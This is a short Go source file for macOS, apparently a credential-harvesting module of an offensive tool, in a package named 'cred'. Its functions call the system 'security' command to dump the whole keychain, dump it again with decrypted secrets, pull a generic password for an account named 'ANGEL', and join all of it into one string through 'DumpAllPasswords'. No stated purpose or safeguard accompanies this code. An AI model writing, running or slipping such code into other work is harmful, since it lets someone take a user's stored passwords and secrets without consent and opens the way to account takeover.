//go:build darwin

package cred

import (
	"os/exec"
)

func DumpKeychain() string {
	cmd := exec.Command("security", "dump-keychain")
	output, err := cmd.Output()
	if err != nil {
		return ""
	}
	return string(output)
}

func DumpInternetPasswords() string {
	cmd := exec.Command("security", "dump-keychain", "-d")
	output, err := cmd.Output()
	if err != nil {
		return ""
	}
	return string(output)
}

func GetGenericPasswords() string {
	cmd := exec.Command("security", "find-generic-password", "-wa", "ANGEL")
	output, err := cmd.Output()
	if err != nil {
		return ""
	}
	return string(output)
}

func DumpAllPasswords() string {
	var result string
	result += DumpKeychain()
	result += DumpInternetPasswords()
	result += GetGenericPasswords()
	return result
}
